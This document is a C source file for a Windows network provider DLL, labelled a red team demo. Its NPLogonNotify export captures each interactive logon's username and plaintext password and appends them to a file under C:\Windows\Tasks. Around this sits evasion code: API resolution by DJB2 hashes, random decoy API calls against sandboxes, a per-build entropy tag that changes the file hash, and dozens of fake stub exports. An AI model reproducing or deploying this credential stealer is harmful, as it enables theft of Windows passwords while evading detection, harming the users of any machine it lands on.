/*
 * TestingProvider.c
 * Enhanced network credential provider - red team assessment demo
 * Additions over baseline network provider:
 *   - API hashing (DJB2) to resolve kernel32 exports at runtime
 *   - NPLogonNotify invokes a random subset of resolved APIs (noise / sandbox jitter)
 *   - 15 additional exported stub functions (plausible NP API surface)
 *   - 20 unrelated WinAPI-named stub exports (PE export table padding)
 */

#include <Windows.h>

/* -----------------------------------------------------------------------
 * NPAPI constants (npapi.h)
 * --------------------------------------------------------------------- */
#define WNNC_SPEC_VERSION       0x00000001
#define WNNC_SPEC_VERSION51     0x00050001
#define WNNC_NET_TYPE           0x00000002
#define WNNC_START              0x0000000C
#define WNNC_WAIT_FOR_START     0x00000001
#define WNNC_CRED_MANAGER       0xFFFF0000

/* Varies .rdata each compile so the DLL file hash changes on rebuild. */
static const char g_BuildEntropyTag[] = __DATE__ " " __TIME__;

/* -----------------------------------------------------------------------
 * ntdef.h types
 * --------------------------------------------------------------------- */
typedef struct _UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

/* -----------------------------------------------------------------------
 * NTSecAPI.h types
 * --------------------------------------------------------------------- */
typedef enum _MSV1_0_LOGON_SUBMIT_TYPE {
    MsV1_0InteractiveLogon      = 2,
    MsV1_0Lm20Logon,
    MsV1_0NetworkLogon,
    MsV1_0SubAuthLogon,
    MsV1_0WorkstationUnlockLogon = 7,
    MsV1_0S4ULogon               = 12,
    MsV1_0VirtualLogon           = 82,
    MsV1_0NoElevationLogon       = 83,
    MsV1_0LuidLogon              = 84,
} MSV1_0_LOGON_SUBMIT_TYPE, *PMSV1_0_LOGON_SUBMIT_TYPE;

typedef struct _MSV1_0_INTERACTIVE_LOGON {
    MSV1_0_LOGON_SUBMIT_TYPE MessageType;
    UNICODE_STRING           LogonDomainName;
    UNICODE_STRING           UserName;
    UNICODE_STRING           Password;
} MSV1_0_INTERACTIVE_LOGON, *PMSV1_0_INTERACTIVE_LOGON;

/* -----------------------------------------------------------------------
 * Function pointer typedefs for hashed resolution
 * --------------------------------------------------------------------- */
typedef HANDLE(WINAPI *fnCreateFileW)(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef BOOL  (WINAPI *fnWriteFile)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef BOOL  (WINAPI *fnCloseHandle)(HANDLE);
typedef DWORD (WINAPI *fnSetFilePointer)(HANDLE,LONG,PLONG,DWORD);
typedef DWORD (WINAPI *fnGetTickCount)(void);
typedef DWORD (WINAPI *fnGetCurrentProcessId)(void);
typedef DWORD (WINAPI *fnGetCurrentThreadId)(void);
typedef VOID  (WINAPI *fnGetSystemTimeAsFileTime)(LPFILETIME);
typedef DWORD (WINAPI *fnGetLastError)(void);
typedef DWORD (WINAPI *fnGetVersion)(void);

/* -----------------------------------------------------------------------
 * DJB2 hash - compile-time constant so no strings appear in .rdata
 * --------------------------------------------------------------------- */
static DWORD Djb2HashA(const char *str)
{
    DWORD h = 5381;
    while (*str)
        h = ((h << 5) + h) ^ (DWORD)(unsigned char)*str++;
    return h;
}

/*
 * Pre-computed hashes (djb2 over ASCII export name).
 */
#define HASH_CreateFileW           0xCDF70C30UL
#define HASH_WriteFile             0xDE34165EUL
#define HASH_CloseHandle           0x687C0D79UL
#define HASH_SetFilePointer        0x111B7D9AUL
#define HASH_GetTickCount          0xA57242E5UL
#define HASH_GetCurrentProcessId   0x9210eadcUL
#define HASH_GetCurrentThreadId    0xBF1A7CD9UL
#define HASH_GetSystemTimeAsFileTime 0x7F0CC3A2UL
#define HASH_GetLastError          0x83363C81UL
#define HASH_GetVersion            0x7505F2C9UL

/* -----------------------------------------------------------------------
 * Walk PE export directory to find a function by DJB2 hash
 * --------------------------------------------------------------------- */
static FARPROC ResolveByHash(HMODULE hMod, DWORD targetHash)
{
    BYTE *base = (BYTE *)hMod;

    IMAGE_DOS_HEADER       *dos  = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS       *nt   = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp  =
        (IMAGE_EXPORT_DIRECTORY *)(base +
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names   = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ordinals= (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs   = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(base + names[i]);
        if (Djb2HashA(name) == targetHash)
            return (FARPROC)(base + funcs[ordinals[i]]);
    }
    return NULL;
}

/* -----------------------------------------------------------------------
 * Resolved function pointers (filled by ResolveApis on first use)
 * --------------------------------------------------------------------- */
static fnCreateFileW            g_CreateFileW            = NULL;
static fnWriteFile              g_WriteFile              = NULL;
static fnCloseHandle            g_CloseHandle            = NULL;
static fnSetFilePointer         g_SetFilePointer         = NULL;
static fnGetTickCount           g_GetTickCount           = NULL;
static fnGetCurrentProcessId   g_GetCurrentProcessId    = NULL;
static fnGetCurrentThreadId     g_GetCurrentThreadId     = NULL;
static fnGetSystemTimeAsFileTime g_GetSystemTimeAsFileTime = NULL;
static fnGetLastError           g_GetLastError           = NULL;
static fnGetVersion             g_GetVersion             = NULL;

static void ResolveApis(void)
{
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) return;

    g_CreateFileW             = (fnCreateFileW)            ResolveByHash(hK32, HASH_CreateFileW);
    g_WriteFile               = (fnWriteFile)              ResolveByHash(hK32, HASH_WriteFile);
    g_CloseHandle             = (fnCloseHandle)            ResolveByHash(hK32, HASH_CloseHandle);
    g_SetFilePointer          = (fnSetFilePointer)         ResolveByHash(hK32, HASH_SetFilePointer);
    g_GetTickCount            = (fnGetTickCount)           ResolveByHash(hK32, HASH_GetTickCount);
    g_GetCurrentProcessId     = (fnGetCurrentProcessId)    ResolveByHash(hK32, HASH_GetCurrentProcessId);
    g_GetCurrentThreadId      = (fnGetCurrentThreadId)     ResolveByHash(hK32, HASH_GetCurrentThreadId);
    g_GetSystemTimeAsFileTime = (fnGetSystemTimeAsFileTime)ResolveByHash(hK32, HASH_GetSystemTimeAsFileTime);
    g_GetLastError            = (fnGetLastError)           ResolveByHash(hK32, HASH_GetLastError);
    g_GetVersion              = (fnGetVersion)             ResolveByHash(hK32, HASH_GetVersion);
}

/* -----------------------------------------------------------------------
 * Credential persistence helper
 * --------------------------------------------------------------------- */
static void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
    ResolveApis();
    if (!g_CreateFileW || !g_WriteFile || !g_CloseHandle || !g_SetFilePointer)
        return;

    HANDLE hFile = g_CreateFileW(
        L"C:\\Windows\\Tasks\\temp40.txt",
        GENERIC_WRITE, 0, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD dw;
        g_SetFilePointer(hFile, 0, NULL, FILE_END);
        g_WriteFile(hFile, username->Buffer, username->Length, &dw, NULL);
        g_WriteFile(hFile, L" -> ", 8, &dw, NULL);
        g_WriteFile(hFile, password->Buffer, password->Length, &dw, NULL);
        g_WriteFile(hFile, L"\r\n", 4, &dw, NULL);
        g_CloseHandle(hFile);
    }
}

/* -----------------------------------------------------------------------
 * Call a random subset of resolved kernel32 APIs (benign side effects only).
 * Entropy: logon LUID + tick count so order varies per logon.
 * --------------------------------------------------------------------- */
static void RandomResolvedApiCalls(PLUID lpLogonId)
{
    DWORD seed = 0x9E3779B9u;
    if (lpLogonId) {
        seed ^= lpLogonId->LowPart;
        seed ^= lpLogonId->HighPart << 16;
    }
    if (g_GetTickCount)
        seed ^= g_GetTickCount();
    else
        seed ^= (DWORD)(ULONG_PTR)lpLogonId;

    /* 3 to 8 calls, LCG step between picks */
    DWORD nCalls = 3u + (seed % 6u);
    for (DWORD i = 0; i < nCalls; i++) {
        seed = seed * 1664525u + 1013904223u;
        DWORD pick = seed % 6u;
        switch (pick) {
        case 0:
            if (g_GetTickCount) (void)g_GetTickCount();
            break;
        case 1:
            if (g_GetCurrentProcessId) (void)g_GetCurrentProcessId();
            break;
        case 2:
            if (g_GetCurrentThreadId) (void)g_GetCurrentThreadId();
            break;
        case 3: {
            FILETIME ft;
            if (g_GetSystemTimeAsFileTime)
                g_GetSystemTimeAsFileTime(&ft);
            break;
        }
        case 4:
            if (g_GetLastError) (void)g_GetLastError();
            break;
        case 5:
            if (g_GetVersion) (void)g_GetVersion();
            break;
        default:
            break;
        }
    }
}


/* =======================================================================
 * Mandatory NP exports
 * ===================================================================== */

__declspec(dllexport)
DWORD APIENTRY NPGetCaps(DWORD nIndex)
{
    switch (nIndex) {
    case WNNC_SPEC_VERSION: return WNNC_SPEC_VERSION51;
    case WNNC_NET_TYPE:     return WNNC_CRED_MANAGER;
    case WNNC_START:        return WNNC_WAIT_FOR_START;
    default:                return 0;
    }
}

__declspec(dllexport)
DWORD APIENTRY NPLogonNotify(
    PLUID   lpLogonId,
    LPCWSTR lpAuthInfoType,
    LPVOID  lpAuthInfo,
    LPCWSTR lpPrevAuthInfoType,
    LPVOID  lpPrevAuthInfo,
    LPWSTR  lpStationName,
    LPVOID  StationHandle,
    LPWSTR *lpLogonScript)
{
    (void)lpLogonId; (void)lpAuthInfoType; (void)lpPrevAuthInfoType;
    (void)lpPrevAuthInfo; (void)lpStationName; (void)StationHandle;

    if (!g_CreateFileW)
        ResolveApis();

    RandomResolvedApiCalls(lpLogonId);

    if (lpAuthInfo)
        SavePassword(
            &(((MSV1_0_INTERACTIVE_LOGON *)lpAuthInfo)->UserName),
            &(((MSV1_0_INTERACTIVE_LOGON *)lpAuthInfo)->Password));

    if (lpLogonScript) *lpLogonScript = NULL;
    return WN_SUCCESS;
}

/* =======================================================================
 * 15 additional plausible NP/credential-manager stub exports
 * These satisfy import-checker tools that enumerate provider capabilities.
 * ===================================================================== */

__declspec(dllexport)
DWORD APIENTRY NPAddConnection(LPVOID lpNetResource, LPWSTR lpPassword, LPWSTR lpUserName)
{
    (void)lpNetResource; (void)lpPassword; (void)lpUserName;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPAddConnection3(HWND hwndOwner, LPVOID lpNetResource,
                                 LPWSTR lpPassword, LPWSTR lpUserName, DWORD dwFlags)
{
    (void)hwndOwner; (void)lpNetResource; (void)lpPassword;
    (void)lpUserName; (void)dwFlags;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPCancelConnection(LPWSTR lpName, BOOL fForce)
{
    (void)lpName; (void)fForce;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPGetConnection(LPWSTR lpLocalName, LPWSTR lpRemoteName, LPDWORD lpBufferSize)
{
    (void)lpLocalName; (void)lpRemoteName; (void)lpBufferSize;
    return WN_NOT_CONNECTED;
}

__declspec(dllexport)
DWORD APIENTRY NPEnumResource(HANDLE hEnum, LPDWORD lpcCount,
                               LPVOID lpBuffer, LPDWORD lpBufferSize)
{
    (void)hEnum; (void)lpcCount; (void)lpBuffer; (void)lpBufferSize;
    return WN_NO_MORE_ENTRIES;
}

__declspec(dllexport)
DWORD APIENTRY NPOpenEnum(DWORD dwScope, DWORD dwType, DWORD dwUsage,
                           LPVOID lpNetResource, LPHANDLE lphEnum)
{
    (void)dwScope; (void)dwType; (void)dwUsage; (void)lpNetResource; (void)lphEnum;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPCloseEnum(HANDLE hEnum)
{
    (void)hEnum;
    return WN_SUCCESS;
}

__declspec(dllexport)
DWORD APIENTRY NPGetResourceParent(LPVOID lpNetResource, LPVOID lpBuffer, LPDWORD lpBufferSize)
{
    (void)lpNetResource; (void)lpBuffer; (void)lpBufferSize;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPGetResourceInformation(LPVOID lpNetResource, LPVOID lpBuffer,
                                         LPDWORD lpBufferSize, LPWSTR *lplpSystem)
{
    (void)lpNetResource; (void)lpBuffer; (void)lpBufferSize; (void)lplpSystem;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPGetUniversalName(LPWSTR lpLocalPath, DWORD dwInfoLevel,
                                   LPVOID lpBuffer, LPDWORD lpBufferSize)
{
    (void)lpLocalPath; (void)dwInfoLevel; (void)lpBuffer; (void)lpBufferSize;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPGetUser(LPWSTR lpName, LPWSTR lpUserName, LPDWORD lpBufferSize)
{
    (void)lpName; (void)lpUserName; (void)lpBufferSize;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPPasswordChangeNotify(
    LPCWSTR lpAuthInfoType, LPVOID lpAuthInfo,
    LPCWSTR lpPrevAuthInfoType, LPVOID lpPrevAuthInfo,
    LPWSTR lpStationName, LPVOID StationHandle, DWORD dwChangeInfo)
{
    (void)lpAuthInfoType; (void)lpAuthInfo; (void)lpPrevAuthInfoType;
    (void)lpPrevAuthInfo; (void)lpStationName; (void)StationHandle; (void)dwChangeInfo;
    return WN_SUCCESS;
}

__declspec(dllexport)
DWORD APIENTRY NPFormatNetworkName(LPWSTR lpRemoteName, LPWSTR lpFormattedName,
                                    LPDWORD lpnLength, DWORD dwFlags, DWORD dwAveCharPerLine)
{
    (void)lpRemoteName; (void)lpFormattedName; (void)lpnLength;
    (void)dwFlags; (void)dwAveCharPerLine;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPGetConnectionPerformance(LPWSTR lpRemoteName, LPVOID lpNetConnectInfoStruct)
{
    (void)lpRemoteName; (void)lpNetConnectInfoStruct;
    return WN_NOT_SUPPORTED;
}

__declspec(dllexport)
DWORD APIENTRY NPDeviceMode(HWND hParent)
{
    (void)hParent;
    return WN_NOT_SUPPORTED;
}

/* -----------------------------------------------------------------------
 * 20 unrelated WinAPI-named stub exports (PE export table only)
 * Internal names avoid SDK collisions; .def maps to WinAPI export names.
 * --------------------------------------------------------------------- */

__declspec(dllexport) DWORD WINAPI Stub_GetFileVersionInfoSizeW(LPCWSTR a, LPDWORD b)
{ (void)a; (void)b; return 0; }

__declspec(dllexport) BOOL WINAPI Stub_VerQueryValueW(LPCVOID a, LPCWSTR b, LPVOID *c, PUINT d)
{ (void)a; (void)b; (void)c; (void)d; return FALSE; }

__declspec(dllexport) BOOL WINAPI Stub_InitCommonControlsEx(LPVOID a)
{ (void)a; return TRUE; }

__declspec(dllexport) LPWSTR WINAPI Stub_PathFindFileNameW(LPCWSTR a)
{ (void)a; return NULL; }

__declspec(dllexport) BOOL WINAPI Stub_PathFileExistsW(LPCWSTR a)
{ (void)a; return FALSE; }

__declspec(dllexport) BOOL WINAPI Stub_PathIsDirectoryW(LPCWSTR a)
{ (void)a; return FALSE; }

__declspec(dllexport) LONG WINAPI Stub_RegOpenKeyExW(HKEY a, LPCWSTR b, DWORD c, REGSAM d, PHKEY e)
{ (void)a; (void)b; (void)c; (void)d; (void)e; return ERROR_FILE_NOT_FOUND; }

__declspec(dllexport) LONG WINAPI Stub_RegQueryValueExW(HKEY a, LPCWSTR b, LPDWORD c, LPDWORD d, LPBYTE e, LPDWORD f)
{ (void)a; (void)b; (void)c; (void)d; (void)e; (void)f; return ERROR_FILE_NOT_FOUND; }

__declspec(dllexport) HANDLE WINAPI Stub_CreateEventW(LPSECURITY_ATTRIBUTES a, BOOL b, BOOL c, LPCWSTR d)
{ (void)a; (void)b; (void)c; (void)d; return NULL; }

__declspec(dllexport) DWORD WINAPI Stub_WaitForSingleObjectEx(HANDLE a, DWORD b, BOOL c)
{ (void)a; (void)b; (void)c; return WAIT_FAILED; }

__declspec(dllexport) DWORD WINAPI Stub_GetEnvironmentVariableW(LPCWSTR a, LPWSTR b, DWORD c)
{ (void)a; (void)b; (void)c; return 0; }

__declspec(dllexport) DWORD WINAPI Stub_ExpandEnvironmentStringsW(LPCWSTR a, LPWSTR b, DWORD c)
{ (void)a; (void)b; (void)c; return 0; }

__declspec(dllexport) UINT WINAPI Stub_GetSystemDirectoryW(LPWSTR a, UINT b)
{ (void)a; (void)b; return 0; }

__declspec(dllexport) UINT WINAPI Stub_GetWindowsDirectoryW(LPWSTR a, UINT b)
{ (void)a; (void)b; return 0; }

__declspec(dllexport) DWORD WINAPI Stub_GetTempPathW(DWORD a, LPWSTR b)
{ (void)a; (void)b; return 0; }

__declspec(dllexport) DWORD WINAPI Stub_FormatMessageW(DWORD a, LPCVOID b, DWORD c, DWORD d, LPWSTR e, DWORD f, va_list *g)
{ (void)a; (void)b; (void)c; (void)d; (void)e; (void)f; (void)g; return 0; }

__declspec(dllexport) HLOCAL WINAPI Stub_LocalAlloc(UINT a, SIZE_T b)
{ (void)a; (void)b; return NULL; }

__declspec(dllexport) HLOCAL WINAPI Stub_LocalFree(HLOCAL a)
{ (void)a; (void)g_BuildEntropyTag[0]; return NULL; }

__declspec(dllexport) BOOL WINAPI Stub_IsDebuggerPresent(void)
{ return FALSE; }


__declspec(dllexport) VOID WINAPI Stub_OutputDebugStringW(LPCWSTR a)
{ (void)a; }
